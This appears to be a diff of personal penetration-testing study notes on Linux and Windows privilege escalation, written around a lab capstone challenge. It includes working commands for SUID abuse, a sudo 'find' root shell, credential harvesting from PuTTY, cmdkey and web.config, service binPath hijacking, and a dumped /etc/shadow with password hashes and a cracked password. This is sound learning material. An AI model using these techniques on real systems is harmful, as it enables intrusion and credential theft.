@@ -58,7 +58,7 @@ socat TCP:<TARGET-IP>:<TARGET-PORT> -
 
 #### Encrypted shells:
 - Usefull since it hides the communication between us and the target, can help with bypassing IDS. 
-```
+``` bash
 openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
 
 cat shell.key shell.crt > shell.pem
@@ -138,3 +138,460 @@ We upload a better shell and execure it via the webshell:
 - We upload a php reverse shell: `/usr/share/webshells/php/php-reverse-shell.php`
 
 Then maybe we managed to get some credential files, and manage to ssh into the machine. 
+
+
+
+### Privsec on Linux:
+Automatic tools/scripts to enumerate:
+https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+https://github.com/rebootuser/LinEnum
+https://github.com/The-Z-Labs/linux-exploit-suggester
+https://github.com/diego-treitos/linux-smart-enumeration
+https://github.com/linted/linuxprivchecker
+
+Kernal exploits to gain privileges:
+``` TIPS AND HELP
+1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
+2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
+3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
+4. You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.
+```
+
+NOTE: When transfeering payload to a linux machine, may folder do not allow us to write no files, hence we cannot upload any files. BUT, the /tmp folder has the sticky bit and allows up to write files but not modify. 
+
+Example of uploading payload, running it and gaining root. 
+![[Pasted image 20250129182805.png]]
+
+
+#### PrivEsc commands with "sudo permission":
+Some doc: https://gtfobins.github.io/ 
+
+TIPS: Good practise to check the files/program that have the s'bit set: 
+```
+find / -type f -perm -04000 -ls 2>/dev/null
+``` 
+
+then compare it against the doc. 
+
+Example: I want to read the /etc/shadows file, but i dont have permission with my user. 
+- I see that /usr/bin/base64 command has the s'bit, and find an exploit in the doc. 
+- I follow the guide, and can read the file:
+![[Pasted image 20250129192046.png]]
+
+NOTE: when a program has the s bit set, it means that the program will run with root privilege
+
+- Some users have sudo premissions on some commands, we can leverage.
+
+**Basic tactics for privilege escalation - if we have sudo access to a text editor:**
+- Reading and cracking the `/etc/shadow` file or adding a new user to the `/etc/passwd` file which have permission to run a root shell. 
+
+#### PrivEsc commands with "capabilities":
+- The s bit might not be set, but a command could have sudo premissions to run a command via capabilities. We can list a users capabilities:
+```
+getcap -r / 2>/dev/null
+```
+
+- Then as before, look in the doc if there is any known way to exploit this 
+
+#### PrivEsc with Cron jobs
+
+- In the /etc/crontab we can see all commands that is scheduled to be executed. 
+- Some of these commands has root privilege, so the idea is to inject our own code into the files ("everything in linux is a file")  of the commands. 
+
+In general 2 ideas to do this:
+- there is a cron-job active, but the file do not exist. So we just make the file with our code.
+- There is a cron-job with a associated file which we have write permission to, so we can change the content. 
+
+NOTE: The file which is to be executed need to have execute permission. 
+
+#### PrivEsc with PATH:
+- The Idea: Look for folders in PATH where the user has write premissions to. Can find this with:
+```
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+
+echo $PATH
+```
+
+- Then we can make a file with out shellcode. And get another program with the s bit to execute our  file. 
+- Our file needs to be within one of the folders in PATH, since this where executable files for our user are located.  
+
+#### PrivEsc with misconfigure of NFS file:
+
+- Idea: We are allowed to mount a folder on the target with our own local folder, and that way upload a malicious file that has s bit. 
+
+Example:
+![[Pasted image 20250130105746.png]]
+
+We can observe 3 files is mountable without root (no_root_squash). So we mount (map) one of them to our own machine. 
+
+Can also show mountable shares from attacking machine:
+```
+showmount -e <target_ip>
+```
+
+Do the mounting:
+```
+sudo mount -o rw <target_ip>:<target_mount_folder> <local_file_we_map>
+```
+
+Then we can write some code that can be executed, and ensure that this file has the s bit:
+![[Pasted image 20250130110148.png]]
+
+- The nfs file is now on the target machine, with the s bit and owned by root. So we can run it and gain an root shell. 
+
+#### Capstone challenge:
+
+**uname -a:**
+```
+
+[missy@ip-10-10-33-93 Documents]$ uname -a
+Linux ip-10-10-33-93 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+Might be an exploit for this:
+- https://github.com/briskets/CVE-2021-3493
+
+
+**id:** `uid=1000(leonard) gid=1000(leonard) groups=1000(leonard) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023`
+
+**sudo -l:** 
+`Sorry, user leonard may not run sudo on ip-10-10-33-93`
+
+Missy sudo -l:
+![[Pasted image 20250130120347.png]]
+
+- we can run find with sudo, we do this and discover the first flag: ![[Pasted image 20250130120555.png]]
+- This file can missy read, so we got the first flag.
+- We also find out that the second flag is located in:
+`/home/rootflag/flag2.txt`
+
+Messed up my box, and it had persistency, so i cannot log back onto any of the users. But we can use the fact that Missy has sudo privs with the 'find' command. Read from the doc that we can get a root shell by:
+```
+find . -exec /bin/sh \; -quit
+```
+
+
+
+
+- Can read /etc/passwd, but not /etc/shadow
+**Users on the target,** we can run: `cat /etc/passwd | cut -d ":" -f 1`
+
+``` USERS
+root
+bin
+daemon
+adm
+lp
+sync
+shutdown
+halt
+mail
+operator
+games
+ftp
+nobody
+pegasus
+systemd-network
+dbus
+polkitd
+colord
+unbound
+libstoragemgmt
+saslauth
+rpc
+gluster
+abrt
+postfix
+setroubleshoot
+rtkit
+pulse
+radvd
+chrony
+saned
+apache
+qemu
+ntp
+tss
+sssd
+usbmuxd
+geoclue
+gdm
+rpcuser
+nfsnobody
+gnome-initial-setup
+pcp
+sshd
+avahi
+oprofile
+tcpdump
+leonard
+mailnull
+smmsp
+nscd
+missy
+```
+
+
+**Files with s bits:**
+```
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+```
+[leonard@ip-10-10-33-93 ~]$ find / -type f -perm -04000 -ls 2>/dev/null
+16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
+17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
+17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
+17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
+17698538   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
+17698537   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
+17698541   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
+17702679  208 ---s--x---   1 root     stapusr    212080 Oct 13  2020 /usr/bin/staprun
+17743302   24 -rws--x--x   1 root     root        23968 Sep 30  2020 /usr/bin/chfn
+17743352   32 -rwsr-xr-x   1 root     root        32128 Sep 30  2020 /usr/bin/su
+17743305   24 -rws--x--x   1 root     root        23880 Sep 30  2020 /usr/bin/chsh
+17831141 2392 -rwsr-xr-x   1 root     root      2447304 Apr  1  2020 /usr/bin/Xorg
+17743338   44 -rwsr-xr-x   1 root     root        44264 Sep 30  2020 /usr/bin/mount
+17743356   32 -rwsr-xr-x   1 root     root        31984 Sep 30  2020 /usr/bin/umount
+17812176   60 -rwsr-xr-x   1 root     root        57656 Aug  9  2019 /usr/bin/crontab
+17787689   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
+18382172   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
+20386935  144 ---s--x--x   1 root     root       147336 Sep 30  2020 /usr/bin/sudo
+34469385   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
+34469387   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
+36070283   12 -rwsr-xr-x   1 root     root        11296 Oct 13  2020 /usr/sbin/usernetctl
+35710927   40 -rws--x--x   1 root     root        40328 Aug  9  2019 /usr/sbin/userhelper
+38394204  116 -rwsr-xr-x   1 root     root       117432 Sep 30  2020 /usr/sbin/mount.nfs
+958368   16 -rwsr-xr-x   1 root     root        15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
+37709347   12 -rwsr-xr-x   1 root     root        11128 Oct 13  2020 /usr/libexec/kde4/kpac_dhcp_helper
+51455908   60 -rwsr-x---   1 root     dbus        57936 Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
+17836404   16 -rwsr-xr-x   1 root     root        15448 Apr  1  2020 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
+18393221   16 -rwsr-xr-x   1 root     root        15360 Oct  1  2020 /usr/libexec/qemu-bridge-helper
+37203442  156 -rwsr-x---   1 root     sssd       157872 Oct 15  2020 /usr/libexec/sssd/krb5_child
+37203771   84 -rwsr-x---   1 root     sssd        82448 Oct 15  2020 /usr/libexec/sssd/ldap_child
+37209171   52 -rwsr-x---   1 root     sssd        49592 Oct 15  2020 /usr/libexec/sssd/selinux_child
+37209165   28 -rwsr-x---   1 root     sssd        27792 Oct 15  2020 /usr/libexec/sssd/proxy_child
+18270608   16 -rwsr-sr-x   1 abrt     abrt        15344 Oct  1  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
+18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap
+```
+- SUID: base64 has s bit set. 
+
+Exploit that:
+```
+[leonard@ip-10-10-33-93 ~]$ /usr/bin/base64 "$LFILE" | base64 --decode
+root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
+bin:*:18353:0:99999:7:::
+daemon:*:18353:0:99999:7:::
+adm:*:18353:0:99999:7:::
+lp:*:18353:0:99999:7:::
+sync:*:18353:0:99999:7:::
+shutdown:*:18353:0:99999:7:::
+halt:*:18353:0:99999:7:::
+mail:*:18353:0:99999:7:::
+operator:*:18353:0:99999:7:::
+games:*:18353:0:99999:7:::
+ftp:*:18353:0:99999:7:::
+nobody:*:18353:0:99999:7:::
+pegasus:!!:18785::::::
+systemd-network:!!:18785::::::
+dbus:!!:18785::::::
+polkitd:!!:18785::::::
+colord:!!:18785::::::
+unbound:!!:18785::::::
+libstoragemgmt:!!:18785::::::
+saslauth:!!:18785::::::
+rpc:!!:18785:0:99999:7:::
+gluster:!!:18785::::::
+abrt:!!:18785::::::
+postfix:!!:18785::::::
+setroubleshoot:!!:18785::::::
+rtkit:!!:18785::::::
+pulse:!!:18785::::::
+radvd:!!:18785::::::
+chrony:!!:18785::::::
+saned:!!:18785::::::
+apache:!!:18785::::::
+qemu:!!:18785::::::
+ntp:!!:18785::::::
+tss:!!:18785::::::
+sssd:!!:18785::::::
+usbmuxd:!!:18785::::::
+geoclue:!!:18785::::::
+gdm:!!:18785::::::
+rpcuser:!!:18785::::::
+nfsnobody:!!:18785::::::
+gnome-initial-setup:!!:18785::::::
+pcp:!!:18785::::::
+sshd:!!:18785::::::
+avahi:!!:18785::::::
+oprofile:!!:18785::::::
+tcpdump:!!:18785::::::
+leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
+mailnull:!!:18785::::::
+smmsp:!!:18785::::::
+nscd:!!:18785::::::
+missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
+```
+
+**Cracked creds:**
+```
+missy : Password1
+```
+
+- PATH:
+```
+leonard@ip-10-10-33-93 ~]$ echo $PATH
+/home/leonard/scripts:/usr/sue/bin:/usr/lib64/qt-3.3/bin:/home/leonard/perl5/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/opt/puppetlabs/bin:/home/leonard/.local/bin:/home/leonard/bin
+```
+
+- Capabilities:
+```
+Non of leonard, missy has any capabilities.
+```
+
+- No Cron-jobs for missy or leonard:
+![[Pasted image 20250130120025.png]]
+
+
+### PrivEsc on Windows:
+Weaknesses we could work with:
+- Misconfig on windows services or scheduled tasks
+- Excessive privileges assigned to our account
+- Vulnerable software
+- Missing Windows security patches 
+
+In addition to administrator and standard user accounts on a windows system we also have special user types:
+![[Pasted image 20250131085543.png]]
+
+
+#### PrivEsc enumeration on windows:
+
+Check powershell history:
+```
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+ISS Configuration:
+ISS is the default web server on windows installations. We can check its config file, web.config, for stored passwords of databases or other stuff:
+
+location of the file. 
+```
+C:\inetpub\wwwroot\web.config
+
+or
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+```
+
+
+View other users credentials:
+```
+cmdkey /list
+
+
+runas /savecred /user:<username> cmd.exe
+```
+
+Check PuTTY for saved proxy credentials:
+```
+
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+
+NOTE: We always use SimonTatham in the path
+```
+
+
+Cheap schedule task trick:
+
+Can use `schtasks` command in cmd to list all schedual tasks. 
+
+![[Pasted image 20250131095433.png]]
+
+
+We want to find a task that executes as another users and which our user can make modifications to(write permissions to the file that gets executed etc)
+
+![[Pasted image 20250131095442.png]]
+
+Then we can write a reverse shell or some other code to the file that gets executed:
+
+![[Pasted image 20250131095520.png]]
+
+Bom! Then we have a rev shell with the permissions of the user that is "running the file", in this case taskusr1. 
+
+Note: that in a real scenario we would have to wait before the scheduled task is executed for this to work. 
+
+#### PrivEsc with service control manager 
+SCM manages the services state of the services on the system. 
+
+A service has an assosiaded executable which it will run. The idea is to find a service with a executable we have write premissions for, and change it to our payload. 
+
+Can look at services with CMD using:
+`sc qc <servicename>`
+
+![[Pasted image 20250131131938.png]]
+
+- This service will run as svcuser1, so by "taking over" this service, we can get his permissions. 
+
+
+Then look at the executable:
+![[Pasted image 20250131131802.png]]
+
+- Can spot: Everyone can modify, so we modify
+![[Pasted image 20250131132050.png]]
+
+- Then the service need to execute, and we get a reverse shell. 
+
+**Another option:** A service is running a executable which has spaces in its filepath:
+![[Pasted image 20250131134904.png]]
+
+The service execute the following:
+![[Pasted image 20250131134923.png]]
+
+So if we have write permissions to the c:\MyPrograms folder, we can make a new disk.exe file with our payload. 
+
+**Another option:**
+We can change the config of the sevices:
+![[Pasted image 20250131145054.png]]
+
+Example: BUILTIN\Users has SERIVCE_ALL_ACCESS, so any user can reconfigure the service thmservice. 
+
+Again we can set a new executable, and also we can change the "owner of the service: Here we change it to system. 
+```
+C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+```
+
+Then, same as before we just need to wait for the service to execute or execute it ourself if we have that option. 
+
+
+#### PrivEsc with windows privilege constants:
+Some users have premission to use some "privilege constants" even though they are not admin. 
+Doc: https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
+
+If our user have access to one, there might be a way to exploit it.
+https://github.com/gtworek/Priv2Admin
+
+check our privilege by: `whoami /priv`
+
+#### PrivEsc with vulnerable software:
+There might be vulnerable software running on the target, due to it being old etc. 
+
+We can check the list of installed software, version and vendor:
+```
+wmic product get name,version,vendor
+```
+
+NOTE: its not 100% to show all software, so one might need to do some digging manually. 
+
+Then one would need to lookup the software with version on exploit.db or google etc to check for exploits. 
+
+#### Tools to automate enumeration on windows:
+- `multi/recon/local_exploit_suggester`
+- https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
+- https://github.com/itm4n/PrivescCheck
+- https://github.com/bitsadmin/wesng
+
+
+
+
+
